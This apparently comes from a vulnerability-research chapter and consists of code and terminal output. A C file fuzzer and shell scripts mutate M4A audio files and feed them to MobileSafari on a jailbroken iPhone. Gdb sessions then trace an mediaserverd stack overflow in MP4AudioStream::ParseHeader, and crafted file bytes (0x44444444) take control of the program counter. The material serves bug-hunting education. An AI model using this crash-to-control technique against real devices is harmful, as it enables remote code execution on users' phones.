["```\n01    #include <stdio.h>\n02    #include <sys/types.h>\n03    #include <sys/mman.h>\n04    #include <fcntl.h>\n05    #include <stdlib.h>\n06    #include <unistd.h>\n07\n08    int\n09    main (int argc, char *argv[])\n10    {\n11        int          fd          = 0;\n12        char *       p           = NULL;\n13        char *       name        = NULL;\n14        unsigned int file_size   = 0;\n15        unsigned int file_offset = 0;\n16        unsigned int file_value  = 0;\n17\n18        if (argc < 2) {\n19            printf (\"[-] Error: not enough arguments\\n\");\n20            return (1);\n21        } else {\n22            file_size   = atol (argv[1]);\n23            file_offset = atol (argv[2]);\n24            file_value  = atol (argv[3]);\n25            name        = argv[4];\n26        }\n27\n28        // open file\n29        fd = open (name, O_RDWR);\n30        if (fd < 0) {\n31            perror (\"open\");\n32            exit (1);\n33        }\n34\n35        // mmap file\n36        p = mmap (0, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n37        if ((int) p == −1) {\n38            perror (\"mmap\");\n39            close (fd);\n40            exit (1);\n41        }\n42\n43        // mutate file\n44        printf (\"[+] file offset: 0x%08x (value: 0x%08x)\\n\",\n file_offset, file_value);\n45        fflush (stdout);\n46        p[file_offset] = file_value;\n47\n48        close (fd);\n49        munmap (p, file_size);\n50\n51        return (0);\n52    }\n```", "```\nlinux$ `gcc -o fuzz fuzz.c`\n```", "```\nlinux$ `cp Alarm.m4r testcase.m4r`\n```", "```\nlinux$ `du -b testcase.m4r`\n415959  testcase.m4r\n```", "```\nlinux$ `./fuzz 415959 4 255 testcase.m4r`\n[+] file offset: 0x00000004 (value: 0x000000ff)\n```", "```\nlinux$ `xxd Alarm.m4r | head −1`\n0000000: 0000 0020 6674 7970 4d34 4120 0000 0000  ... ftypM4A ....\n\nlinux$ `xxd testcase.m4r | head −1`\n0000000: 0000 0020 ff74 7970 4d34 4120 0000 0000  ... .typM4A ....\n```", "```\n01    #!/bin/bash\n02\n03    # file size\n04    filesize=415959\n05\n06    # file offset\n07    off=0\n08\n09    # number of files\n10    num=4\n11\n12    # fuzz value\n13    val=255\n14\n15    # name counter\n16    cnt=0\n17\n18    while [ $cnt -lt $num ]\n19    do\n20          cp ./Alarm.m4r ./file$cnt.m4a\n21          ./fuzz $filesize $off $val ./file$cnt.m4a\n22          let \"off+=1\"\n23          let \"cnt+=1\"\n24    done\n```", "```\nlinux$ `./go.sh`\n[+] file offset: 0x00000000 (value: 0x000000ff)\n[+] file offset: 0x00000001 (value: 0x000000ff)\n[+] file offset: 0x00000002 (value: 0x000000ff)\n[+] file offset: 0x00000003 (value: 0x000000ff)\n```", "```\nlinux$ `xxd file0.m4a | head −1`\n0000000: ff00 0020 6674 7970 4d34 4120 0000 0000  ... ftypM4A ....\n\nlinux$ `xxd file1.m4a | head −1`\n0000000: 00ff 0020 6674 7970 4d34 4120 0000 0000  ... ftypM4A ....\n\nlinux$ `xxd file2.m4a | head −1`\n0000000: 0000 ff20 6674 7970 4d34 4120 0000 0000  ... ftypM4A ....\n\nlinux$ `xxd file3.m4a | head −1`\n0000000: 0000 00ff 6674 7970 4d34 4120 0000 0000  ....ftypM4A ....\n```", "```\n01    #!/bin/bash\n02\n03     fuzzhost=192.168.99.103\n04\n05     echo [+] =================================\n06     echo [+] Start fuzzing\n07     echo [+]\n08     echo -n \"[+] Cleanup: \"\n09     killall MobileSafari\n10     killall mediaserverd\n11     sleep 5\n12     echo\n13\n14     origpid=`ps -u mobile -o pid,command | grep /usr/sbin/\nmediaserverd | cut -c 0-5`\n15     echo [+] Original PID of /usr/sbin/mediaserverd: $origpid\n16\n17     currpid=$origpid\n18     let cnt=0\n19     let i=0\n20\n21     while [ $cnt -le 1000 ];\n22     do\n23             if [ $i -eq 10 ];\n24             then\n25                     echo -n \"[+] Restarting mediaserverd.. \"\n26                     killall mediaserverd\n27                     sleep 4\n28                    origpid=`ps -u mobile -o pid,command | grep /usr/sbin/ →\nmediaserverd | cut -c 0-5`\n29                     currpid=$origpid\n30                     sleep 10\n31                     echo \"done\"\n32                     echo [+] New mediaserverd PID: $origpid\n33                     i=0\n34             fi\n35             echo\n36             echo [+] =================================\n37             echo [+] Current file: http://$fuzzhost/file$cnt.m4a\n38             openURL http://$fuzzhost/file$cnt.m4a\n39             sleep 30\n40             currpid=`ps -u mobile -o pid,command | grep /usr/sbin/\nmediaserverd | → cut -c 0-5`\n41             echo [+] Current PID of /usr/sbin/mediaserverd: $currpid\n42             if [ $currpid -ne $origpid ];\n43             then\n44                     echo [+] POTENTIAL BUG FOUND! File: file$cnt.m4a\n45                     openURL http://$fuzzhost/BUG_FOUND_file$cnt.m4a\n46                     origpid=$currpid\n47                     sleep 5\n48             fi\n49             ((cnt++))\n50             ((i++))\n51             killall MobileSafari\n52     done\n53\n54     killall MobileSafari\n```", "```\nlinux$ `grep BUG /var/log/apache2/access.log`\n192.168.99.103 .. \"GET /`BUG_FOUND_file40.m4a`\n HTTP/1.1\" 404 277 \"-\" \"Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X;\n en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1\n Mobile/5H11 Safari/525.20\"\n192.168.99.103 .. \"GET /`BUG_FOUND_file41.m4a` HTTP/1.1\"\n 404 276 \"-\" \"Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us)\n AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20\"\n192.168.99.103 .. \"GET /`BUG_FOUND_file42.m4a` HTTP/1.1\"\n 404 277 \"-\" \"Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us)\n AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20\"\n[..]\n```", "```\niphone# `uname -a`\nDarwin localhost 9.4.1 Darwin Kernel Version 9.4.1: Mon Dec\n  8 20:59:30 PST 2008; root:xnu-1228.7.37~4/RELEASE_ARM_S5L8900X\n iPhone1,1 arm M68AP Darwin\n\niphone# `id`\nuid=0(root) gid=0(wheel)\n\niphone# `gdb -q`\n```", "```\n(gdb) `shell ps -u mobile -O pid | grep mediaserverd`\n   27   ??  Ss     0:01.63 /usr/sbin/mediaserverd\n```", "```\n(gdb) `exec-file /usr/sbin/mediaserverd`\nReading symbols for shared libraries ......... done\n\n(gdb) `attach 27`\nAttaching to program: `/usr/sbin/mediaserverd', process 27.\nReading symbols for shared libraries ..................................... done\n0x3146baa4 in mach_msg_trap ()\n```", "```\n(gdb) `set follow-fork-mode child`\n\n(gdb) `continue`\nContinuing.\n```", "```\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_PROTECTION_FAILURE at address: 0x01302000\n[Switching to process 27 thread 0xa10b]\n0x314780ec in memmove ()\n```", "```\n(gdb) `x/1x 0x01302000`\n0x1302000:      Cannot access memory at address 0x1302000\n```", "```\n(gdb) `backtrace`\n#0  0x314780ec in memmove ()\n#1  0x3493d5e0 in MP4AudioStream::ParseHeader ()\n`#2  0x00000072 in ?? ()`\nCannot access memory at address 0x72\n```", "```\n(gdb) `x/1i 0x3493d5e0 - 4`\n0x3493d5dc <_ZN14MP4AudioStream11ParseHeaderER27AudioFileStream\nContinuation+1652>:      bl      0x34997374 <dyld_stub_memcpy>\n```", "```\n(gdb) `break *0x3493d5dc`\nBreakpoint 1 at 0x3493d5dc\n\n(gdb) `continue`\nContinuing.\n```", "```\n[Switching to process 27 thread 0x9c0b]\n\nBreakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()\n```", "```\n(gdb) `info registers r0 r1 r2`\nr0             0x684a38 6834744\nr1             0x115030 1134640\nr2             0x1fd0   8144\n```", "```\n(gdb) `x/40x $r1`\n0x115030:       0x00000000      0xd7e178c2      0xe5e178c2      0x80bb0000\n0x115040:       0x00b41000      0x00000100      0x00000001      0x00000000\n0x115050:       0x00000000      0x00000100      0x00000000      0x00000000\n0x115060:       0x00000000      0x00000100      0x00000000      0x00000000\n0x115070:       0x00000000      0x00000040      0x00000000      0x00000000\n0x115080:       0x00000000      0x00000000      0x00000000      0x00000000\n0x115090:       0x02000000      0x2d130000      0x6b617274      0x5c000000\n0x1150a0:       0x64686b74      0x07000000      0xd7e178c2      0xe5e178c2\n0x1150b0:       0x01000000      0x00000000      0x00b41000      0x00000000\n0x1150c0:       0x00000000      0x00000000      0x00000001      0x00000100\n```", "```\n[..]\n00000030h: 00 00 00 00 C2 78 E1 D7 C2 78 E1 E5 00 00 BB 80 ; ....Âxá×Âxáå..»₠\n00000040h: 00 10 B4 00 00 01 00 00 01 00 00 00 00 00 00 00 ; ..'.............\n00000050h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................\n00000060h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................\n00000070h: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 ; ....@...........\n[..]\n```", "```\n(gdb) `continue`\nContinuing.\n\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_PROTECTION_FAILURE at address: 0x00685000\n0x314780ec in memmove ()\n```", "```\n00000000h: 00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00 ; ... ftypM4A ....\n00000010h: 4D 34 41 20 6D 70 34 32 69 73 6F 6D 00 00 00 00 ; M4A mp42isom....\n00000020h: 00 00 1C 65 6D 6F 6F 76 FF 00 00 6C 6D 76 68 64 ; ...emoovÿ..lmvhd\n[..]\n```", "```\n00000020h: 00 00 1C 65 6D 6F 6F 76 FF 00 00 6C 6D 76 68 64 ; ...emoovÿ..lmvhd\n```", "```\n00000020h: 00 00 1C 65 6D 6F 6F 76 00 00 02 6C 6D 76 68 64 ; ...emoovÿ..lmvhd\n```", "```\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_PROTECTION_FAILURE at address: 0x00000072\n[Switching to process 27 thread 0xa10b]\n0x00000072 in ?? ()\n```", "```\n(gdb) `break *0x3493d5dc`\nBreakpoint 1 at 0x3493d5dc\n\n(gdb) `continue`\nContinuing.\n```", "```\n[Switching to process 71 thread 0x9f07]\n\nBreakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()\n```", "```\n`(gdb) backtrace`\n`#0  0x3493d5dc in MP4AudioStream::ParseHeader ()`\n#1  0x3490d748 in AudioFileStreamWrapper::ParseBytes ()\n#2  0x3490cfa8 in AudioFileStreamParseBytes ()\n#3  0x345dad70 in PushBytesThroughParser ()\n#4  0x345dbd3c in FigAudioFileStreamFormatReaderCreateFromStream ()\n#5  0x345dff08 in instantiateFormatReader ()\n#6  0x345e02c4 in FigFormatReaderCreateForStream ()\n#7  0x345d293c in itemfig_assureBasicsReadyForInspectionInternal ()\n#8  0x345d945c in itemfig_makeReadyForInspectionThread ()\n#9  0x3146178c in _pthread_body ()\n#10 0x00000000 in ?? ()\n```", "```\n(gdb) `info frame 0`\nStack frame at 0x1301c00:\n pc = 0x3493d5dc in MP4AudioStream::ParseHeader(AudioFileStream\nContinuation&); saved pc 0x3490d748\n called by frame at 0x1301c30\n Arglist at 0x1301bf8, args:\n Locals at 0x1301bf8, Saved registers:\n  r4 at 0x1301bec, r5 at 0x1301bf0, r6 at 0x1301bf4, r7\n at 0x1301bf8, r8 at                                   → 0x1301be0, sl at\n 0x1301be4, fp at 0x1301be8, lr at 0x1301bfc, `pc at 0x1301bfc`,\n  s16 at 0x1301ba0, s17 at 0x1301ba4, s18 at 0x1301ba8, s19 at\n 0x1301bac, s20 at                    → 0x1301bb0, s21 at 0x1301bb4,\n s22 at 0x1301bb8, s23 at 0x1301bbc,\n  s24 at 0x1301bc0, s25 at 0x1301bc4, s26 at 0x1301bc8, s27 at\n 0x1301bcc, s28 at                    → 0x1301bd0, s29 at 0x1301bd4,\n s30 at 0x1301bd8, s31 at 0x1301bdc\n```", "```\n(gdb) `continue`\nContinuing.\n\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_PROTECTION_FAILURE at address: 0x00000072\n0x00000072 in ?? ()\n```", "```\n(gdb) `x/12x 0x1301bfc`\n0x1301bfc:      0x00000073      0x00000000      0x04000001      0x0400002d\n0x1301c0c:      0x00000000      0x73747328      0x00000063      0x00000000\n0x1301c1c:      0x00000002      0x00000001      0x00000017      0x00000001\n```", "```\n000001f0h: 18 73 74 74 73 00 00 00 00 00 00 00 01 00 00 04 ; .stts...........\n00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...\n00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................\n```", "```\n000001f0h: 18 73 74 74 44 44 44 44 00 00 00 00 01 00 00 04 ; .sttDDDD.........\n00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...\n00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................\n```", "```\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: KERN_INVALID_ADDRESS at address: 0x44444444\n[Switching to process 77 thread 0xa20f]\n`0x44444444 in ?? ()`\n\n(gdb) `info registers`\nr0             0x6474613f       1685348671\nr1             0x393fc284       960479876\nr2             0xcb0            3248\nr3             0x10b            267\nr4             0x6901102        110104834\nr5             0x1808080        25198720\nr6             0x2              2\nr7             0x74747318       1953788696\nr8             0xf40100         15991040\nr9             0x817a00         8485376\nsl             0xf40100         15991040\nfp             0x80808005      −2139062267\nip             0x20044          131140\nsp             0x684c00         6835200\nlr             0x1f310          127760\n`pc             0x44444444`       1145324612\ncpsr           {0x60000010, n = 0x0, z = 0x1, c = 0x1, v = 0x0,\n q = 0x0, j = 0x0, ge = 0x0, e = 0x0, a = 0x0, i = 0x0, f = 0x0, t = 0x0,\n mode = 0x10}   {0x60000010, n = 0, z = 1, c = 1, v = 0, q = 0, j = 0, ge = 0,\n e = 0, a = 0, i = 0, f = 0, t = 0, mode = usr}\n\n`(gdb) backtrace`\n`#0  0x44444444 in ?? ()`\nCannot access memory at address 0x74747318\n```"]